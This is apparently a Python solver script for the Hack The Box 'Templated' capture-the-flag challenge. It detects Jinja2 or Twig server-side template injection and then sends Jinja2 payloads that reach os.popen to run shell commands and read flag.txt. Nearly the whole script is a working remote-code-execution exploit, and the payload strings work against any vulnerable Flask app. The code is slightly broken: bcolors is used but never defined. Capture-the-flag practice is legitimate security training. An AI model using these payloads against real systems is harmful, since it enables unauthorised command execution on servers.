# Challenge: Templated
# https://app.hackthebox.eu/challenges/templated
#
# https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti
# https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee
# https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python

import requests
from bs4 import BeautifulSoup
import hashlib
import HTMLParser

####### START EDITING

URL = "http://xxx.xxx.xxx.xxx:xxxx/"

CHECKPOPEN = "{{ ''.__class__.__mro__[1].__subclasses__() }}" # Edit [1] as needed
EXPLOIT = "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('whoami; pwd; ls -ld * | grep flag').read()}}{%endif%}{%endfor%}"

NEEDLE = 'str'
FLAG = "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('cat flag.txt').read()}}{%endif%}{%endfor%}"

####### STOP EDITING

# Check for Jinja2 or Twig
CHECK = "{{7*7}}"
page = requests.get(URL + CHECK)

if "49" in page.content:
    CHECK = "{{7*'7'}}"
    page = requests.get(URL + CHECK)

    if "49" in page.content:
        print("\n[+] Appears to be vulnerable to SSTI => Twig")
        exploitable = True

    if "7777777" in page.content:
        print("\n[+] Appears to be vulnerable to SSTI => Jinja2")
        print("[+] Checking for Popen with payload " + bcolors.FAIL + CHECKPOPEN)
        page = requests.get(URL + CHECKPOPEN)
        pageContent = HTMLParser.HTMLParser().unescape(page.content);
        
        # Check for Popen
        if "Popen" in pageContent:
            print("[+] Found Popen")
            print("[+] Exploiting with payload " + bcolors.FAIL + EXPLOIT)
            page = requests.get(URL + EXPLOIT)
            pageContent = HTMLParser.HTMLParser().unescape(page.content);

            # Check for flag.txt
            if "flag.txt" in pageContent:
                print("[+] Found flag.txt")
                page = requests.get(URL + FLAG)
                soup = BeautifulSoup(page.content, "html.parser")
                string = soup.find(NEEDLE).text
                print("[+]=> " + string)

else:
    print("[-] Does not appear vulnerable to SSTI (Jinja2 or Twig)")